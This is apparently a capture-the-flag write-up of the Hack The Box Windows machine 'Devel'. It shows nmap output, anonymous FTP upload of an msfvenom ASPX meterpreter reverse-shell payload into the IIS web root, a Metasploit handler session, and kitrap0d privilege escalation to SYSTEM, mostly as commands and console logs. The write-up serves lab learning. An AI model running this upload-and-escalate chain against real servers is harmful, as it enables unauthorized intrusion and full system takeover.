# HTB - Devel
## OS - Windows

Devel seems similar to Optimum. I started with an nmap scan of Devel (IP address 10.10.10.5)

```
$nmap -sC -sV -o Devel 10.10.10.5
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 16:01 PDT
Nmap scan report for 10.10.10.5
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds
```


The scan shows that FTP and HTTP ports are open. Anonymous FTP is on. 
Microsoft IIS server is running, and FTP result shows that iisstart.htm and welcome.png, the files that are served by IIS Server, are in the same file path for FTP.

We can test it by sending a file through FTP. I created a random .htm file (since the other file was a .htm), and FTP'd to Devel VM, and then browsed to http://10.10.10.5/<FILENAME> and it worked.
  
  Tried to use Metasploit for exploitation. Metaspoit has an auxiliary FTP scanner to detect anonymous login (auxiliary/scanner/ftp/anonymous), but I could not figure out how to use that for exploiting. 

  So whatever I send now, has to be through FTP and it should be good enough to have a reverse tcp shell. 
  
 I used Social ENgineering Toolkit to create a payload with reverse_tcp, saved it as .aspx file, and FTP'd to 10.10.10.5. When I brosed to the payload.aspx file though, I got a runtime error. So that did not work. 
 
 I then used msfvenom to generate the payload. This tool has more options.
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.10.5 LPORT=4445 -o payload.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2798 bytes
Saved as: payload.aspx
┌─[root@parrot]─[/home/vskonda/Downloads/HTB-WriteUps]
└──╼ #ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:vskonda): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
09-30-20  10:14AM                   13 devel-test.htm
03-17-17  05:37PM                  689 iisstart.htm
09-30-20  10:33AM                74162 payload.aspx
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> del payload.aspx
250 DELE command successful.
ftp> put payload.aspx
local: payload.aspx remote: payload.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2834 bytes sent in 0.00 secs (27.3001 MB/s)
ftp> exit
221 Goodbye.
┌─[root@parrot]─[/home/vskonda/Downloads/HTB-WriteUps]
└──╼ #


 
 ```

Now we start metasploit and use exploit/multi/handler, and run the payload on the IIS browser.

````

msf5 exploit(multi/handler) > set LHOST 10.10.14.12
LHOST => 10.10.14.12
msf5 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.12:5555 
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.12:5555 -> 10.10.10.5:49157) at 2020-09-26 17:11:17 -0700

````

I got a shell, but I did not have enough privileges to go to Users folder. So I used post/multi/recon/local_exploit_suggester  for privilege escalation.

```
msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 30 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

```


I used several of these modules, but the mistake I made is to use "expoit" command instead of "run", so the modules failed. Finally I used "run" and it worked.

```
msf5 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.12
LHOST => 10.10.14.12
msf5 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 5559
LPORT => 5559
msf5 exploit(windows/local/ms10_015_kitrap0d) > exploit

[*] Started reverse TCP handler on 172.25.252.98:5559 
[*] Launching notepad to host the exploit...
[+] Process 1412 launched.
[*] Reflectively injecting the exploit DLL into 1412...
[*] Injecting exploit into 1412 ...
[*] Exploit injected. Injecting payload into 1412...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/ms10_015_kitrap0d) > show options



msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.12
LHOST => 10.10.14.12
msf5 exploit(windows/local/ms10_015_kitrap0d) > show SESSIONS
[-] Invalid parameter "SESSIONS", use "show -h" for more information
msf5 exploit(windows/local/ms10_015_kitrap0d) > show sessions

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.12:5555 -> 10.10.10.5:49157 (10.10.10.5)

msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.12:5559 
[*] Launching notepad to host the exploit...
[+] Process 4048 launched.
[*] Reflectively injecting the exploit DLL into 4048...
[*] Injecting exploit into 4048 ...
[*] Exploit injected. Injecting payload into 4048...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.12:5559 -> 10.10.10.5:49167) at 2020-09-26 17:21:12 -0700

meterpreter > shell
Process 192 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```

There were several tries, with different tools, but ultimately it worked and I got both the flags.
